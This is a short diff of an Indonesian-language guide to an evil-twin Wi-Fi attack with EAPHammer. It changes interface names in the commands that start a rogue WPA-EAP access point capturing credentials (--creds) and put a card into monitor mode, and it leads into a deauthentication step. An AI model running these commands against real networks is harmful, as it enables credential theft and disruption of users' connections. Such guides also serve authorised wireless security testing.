@@ -59,13 +59,13 @@ sudo eaphammer --cert-wizard
 #### 4. Jalankan EAPHammer:
 
 ```
-sudo eaphammer -i wlan1mon --channel [channel] --auth wpa-eap --essid [essid] --creds
+sudo eaphammer -i wlan0 --channel [channel] --auth wpa-eap --essid [essid] --creds
 ```
 
 #### 5. Set channel interface:
 
 ```
-sudo airmon-ng start wlan1 [channel]
+sudo airmon-ng start wlan1mon [channel]
 ```
 
 #### 6. Jalankan serangan deauth:
